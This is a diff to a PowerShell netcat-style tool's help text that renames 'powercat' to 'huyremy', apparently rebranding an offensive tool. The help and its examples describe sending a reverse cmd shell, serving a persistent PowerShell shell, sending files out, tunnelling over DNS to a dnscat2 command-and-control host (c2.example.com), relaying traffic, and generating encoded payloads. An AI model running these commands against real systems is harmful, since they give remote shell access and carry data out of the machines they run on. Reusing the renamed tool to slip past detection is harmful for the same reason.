@@ -62,21 +62,21 @@ Usage: huyremy [-c or -l] [-p port] [options]
   -i  <input>     Input. Provide data to be sent down the pipe as soon as a connection is
                   established. Used for moving files. You can provide the path to a file,
                   a byte array object, or a string. You can also pipe any of those into
-                  powercat, like 'aaaaaa' | powercat -c 10.1.1.1 -p 80
+                  huyremy, like 'aaaaaa' | huyremy -c 10.1.1.1 -p 80
             
-  -o  <type>      Output. Specify how powercat should return information to the console.
+  -o  <type>      Output. Specify how huyremy should return information to the console.
                   Valid options are 'Bytes', 'String', or 'Host'. Default is 'Host'.
             
   -of <path>      Output File.  Specify the path to a file to write output to.
             
-  -d              Disconnect. powercat will disconnect after the connection is established
+  -d              Disconnect. huyremy will disconnect after the connection is established
                   and the input from -i is sent. Used for scanning.
             
-  -rep            Repeater. powercat will continually restart after it is disconnected.
+  -rep            Repeater. huyremy will continually restart after it is disconnected.
                   Used for setting up a persistent server.
                   
   -g              Generate Payload.  Returns a script as a string which will execute the
-                  powercat with the options you have specified. -i, -d, and -rep will not
+                  huyremy with the options you have specified. -i, -d, and -rep will not
                   be incorporated.
                   
   -ge             Generate Encoded Payload. Does the same as -g, but returns a string which
@@ -87,30 +87,30 @@ Usage: huyremy [-c or -l] [-p port] [options]
 Examples:
 
   Listen on port 8000 and print the output to the console.
-      powercat -l -p 8000
+      huyremy -l -p 8000
   
   Connect to 10.1.1.1 port 443, send a shell, and enable verbosity.
-      powercat -c 10.1.1.1 -p 443 -e cmd -v
+      huyremy -c 10.1.1.1 -p 443 -e cmd -v
   
   Connect to the dnscat2 server on c2.example.com, and send dns queries
   to the dns server on 10.1.1.1 port 53.
-      powercat -c 10.1.1.1 -p 53 -dns c2.example.com
+      huyremy -c 10.1.1.1 -p 53 -dns c2.example.com
   
   Send a file to 10.1.1.15 port 8000.
-      powercat -c 10.1.1.15 -p 8000 -i C:\inputfile
+      huyremy -c 10.1.1.15 -p 8000 -i C:\inputfile
   
   Write the data sent to the local listener on port 4444 to C:\outfile
-      powercat -l -p 4444 -of C:\outfile
+      huyremy -l -p 4444 -of C:\outfile
   
   Listen on port 8000 and repeatedly server a powershell shell.
-      powercat -l -p 8000 -ep -rep
+      huyremy -l -p 8000 -ep -rep
   
   Relay traffic coming in on port 8000 over tcp to port 9000 on 10.1.1.1 over tcp.
-      powercat -l -p 8000 -r tcp:10.1.1.1:9000
+      huyremy -l -p 8000 -r tcp:10.1.1.1:9000
       
   Relay traffic coming in on port 8000 over tcp to the dnscat2 server on c2.example.com,
   sending queries to 10.1.1.1 port 53.
-      powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com
+      huyremy -l -p 8000 -r dns:10.1.1.1:53:c2.example.com
 "
   if($h){return $Help}
   ############### HELP ###############
